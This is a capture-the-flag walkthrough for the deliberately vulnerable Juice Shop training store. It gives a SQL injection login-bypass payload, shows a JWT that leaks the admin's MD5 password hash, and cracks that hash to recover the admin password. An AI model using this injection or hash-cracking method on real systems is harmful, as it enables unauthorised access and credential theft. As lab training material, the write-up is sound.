# Level 2

## Admin Section
_Access the administration section of the store._

At first, you need to log in with `admin` role. See one of:
- [Level 2 / Login Admin](#login-admin)
- [Level 3 / Admin Registration](level3.md#admin-registration)

Then, go to `/main-es2015.js` and search for `admin`. One of the results is:
```
,{path:"administration",component:Xi,canActivate:[_]},
```

Navigate to `/#/administration`

## Login Admin
_Log in with the administrator's user account._

According to the challenge category, we need to use (SQL) injection.

Go to the _Login_ form (`/#/login`)

![](images/login.png)

```
E-mail: ' or 1=1;
Password: aaaaaaaaa
```

Luckily, admin is the first user in the database.

## Password Strength
_Log in with the administrator's user credentials without previously changing them or applying SQL Injection._

At first, log in as admin (see [Login Admin](#login-admin) challenge).

Grab the JWT token from cookies:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMC0wOC0xNCAwOTozNjoyOC4wNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0wOC0xNCAwOTozNjoyOC4wNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNTk3Mzk4NTA5LCJleHAiOjE1OTc0MTY1MDl9.uRUsiD4NRpn8TXX7JUvwb1TbhAvVZZVA3sZWV8qJiHzWNtnqzQB5T7mz-GASQrsp6WNdvpVjtHwabbj9ZfSzCmgmMxs_JRaY4RyjHrSs6GWmwU1dNmhiL8I-TVmIF5_4Ujd9BxoxX_MAvVs7-Gme932CcTPwZ4sbEmWiv_-nbRA
```

Decode it (https://jwt.io/):
```
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "deluxeToken": "",
    "lastLoginIp": "0.0.0.0",
    "profileImage": "assets/public/images/uploads/default.svg",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2020-08-14 09:36:28.074 +00:00",
    "updatedAt": "2020-08-14 09:36:28.074 +00:00",
    "deletedAt": null
  },
  "iat": 1597398509,
  "exp": 1597416509
}
```

The password hash is `0192023a7bbd73250516f069df18b500`.
Based on the hash length (128 bits), this is most likely `md5`.
Assuming the password is weak, it can be easily reverted.
Go to https://hashtoolkit.com/decrypt-md5-hash/0192023a7bbd73250516f069df18b500
The password is `admin123`.

Log out and log in again with `admin@juice-sh.op` / `admin123`